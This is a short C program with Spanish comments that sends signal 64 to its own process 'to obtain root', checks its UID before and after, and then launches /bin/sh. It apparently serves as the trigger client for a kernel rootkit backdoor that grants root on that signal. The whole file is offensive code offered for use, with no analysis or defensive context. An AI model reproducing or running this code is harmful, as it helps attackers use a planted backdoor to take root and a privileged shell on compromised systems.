#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    pid_t pid = getpid();
    printf("PID: %d\n", pid);
    printf("UID before: %d\n", getuid());
    
    // Enviar señal 64 para obtener root
    kill(pid, 64);
    
    printf("UID after: %d\n", getuid());
    
    // Ejecutar shell con privilegios
    execl("/bin/sh", "sh", NULL);
    
    return 0;
}
